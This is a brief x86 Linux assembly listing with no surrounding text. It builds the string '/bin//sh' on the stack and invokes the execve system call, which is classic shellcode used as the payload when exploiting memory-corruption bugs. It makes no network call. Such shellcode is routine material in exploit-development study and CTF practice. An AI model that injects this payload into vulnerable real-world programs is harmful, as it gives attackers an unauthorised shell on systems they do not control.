global _start

section .text

_start:
 	xor ecx, ecx
 	mul ecx
 	push ecx
 	push 0x68732f2f   ;; hs//
 	push 0x6e69622f   ;; nib/
 	mov ebx, esp
 	mov al, 11
 	int 0x80